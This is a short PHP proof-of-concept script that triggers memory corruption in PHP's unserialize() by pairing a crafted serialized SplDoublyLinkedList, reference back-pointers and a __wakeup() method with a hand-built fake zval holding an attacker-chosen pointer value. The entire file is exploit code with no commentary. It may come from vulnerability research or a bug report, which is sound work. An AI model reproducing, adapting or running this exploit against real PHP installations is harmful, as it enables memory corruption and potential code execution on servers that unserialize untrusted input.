<?php

class obj {
	var $ryat;
	function __wakeup() {
		$this->ryat = 1;
	}
}

$fakezval = ptr2str(1122334455);
$fakezval .= ptr2str(0);
$fakezval .= "\x00\x00\x00\x00";
$fakezval .= "\x01";
$fakezval .= "\x00";
$fakezval .= "\x00\x00";

$inner = 'i:1234;:i:1;';
$exploit = 'a:5:{i:0;i:1;i:1;C:19:"SplDoublyLinkedList":'.strlen($inner).':{'.$inner.'}i:2;O:3:"obj":1:{s:4:"ryat";R:3;}i:3;a:1:{i:0;R:5;}i:4;s:'.strlen($fakezval).':"'.$fakezval.'";}';

$data = unserialize($exploit);

var_dump($data);

function ptr2str($ptr)
{
	$out = '';
	for ($i = 0; $i < 8; $i++) {
		$out .= chr($ptr & 0xff);
		$ptr >>= 8;
	}
	return $out;
}

?>
